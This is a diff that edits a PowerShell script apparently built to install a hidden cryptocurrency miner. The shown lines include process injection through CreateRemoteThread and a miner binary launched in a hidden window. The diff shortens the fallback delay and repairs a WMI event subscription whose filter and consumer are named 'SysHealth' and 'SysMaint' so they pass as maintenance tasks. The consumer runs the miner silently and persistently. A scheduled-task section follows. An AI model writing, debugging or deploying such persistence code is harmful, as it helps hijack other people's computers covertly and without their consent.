@@ -45,7 +45,7 @@ try {
     [Injector]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLib, $alloc, 0, [IntPtr]::Zero)
 }
 catch {
-    Start-Sleep -Seconds 180
+    Start-Sleep -Seconds 5
     Start-Process "$minerHome\$minerBinary" -WindowStyle Hidden
 }
 
@@ -60,23 +60,45 @@ Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
     Remove-WmiObject -ErrorAction SilentlyContinue
 
 # WMI Subscription
-# Replace Set-WmiInstance with CIM cmdlets
-$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{
-    Name           = "SysHealth_$((Get-Date).Ticks)"
-    EventNamespace = 'root/cimv2'
-    Query          = $wmiQuery
-    QueryLanguage  = 'WQL'
-}
+# 3. WMI Event Subscription (Fixed)
+try {
+    # Clean up existing WMI artifacts
+    Get-WmiObject -Namespace root\subscription -Class __EventFilter | 
+        Where-Object { $_.Name -like "SysHealth_*" } | 
+        Remove-WmiObject -ErrorAction SilentlyContinue
 
-$consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{
-    Name                = "SysMaint_$((Get-Date).Ticks)"
-    CommandLineTemplate = "`"$destinationPath`" --donate-level=0"
-    RunInteractively    = $false
-}
+    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | 
+        Where-Object { $_.Name -like "SysMaint_*" } | 
+        Remove-WmiObject -ErrorAction SilentlyContinue
 
-$binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
-    Filter   = $filter
-    Consumer = $consumer
+    # Create Event Filter
+    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+        Name           = "SysHealth_$((Get-Date).Ticks)"
+        EventNamespace = 'root\cimv2'
+        Query          = $wmiQuery
+        QueryLanguage  = 'WQL'
+    }
+
+    # Create Consumer
+    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+        Name                 = "SysMaint_$((Get-Date).Ticks)"
+        CommandLineTemplate  = "`"$destinationPath`" --donate-level=0"
+        RunInteractively      = $false  # Critical for background execution
+    }
+
+    # Verify objects exist before binding
+    if ($filter -and $consumer) {
+        $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
+            Filter   = $filter.__PATH
+            Consumer = $consumer.__PATH
+        }
+    }
+    else {
+        Write-Warning "Failed to create WMI filter/consumer. Binding skipped."
+    }
+}
+catch {
+    Write-Warning "WMI Error: $($_.Exception.Message)"
 }
 # Scheduled Task
 try {
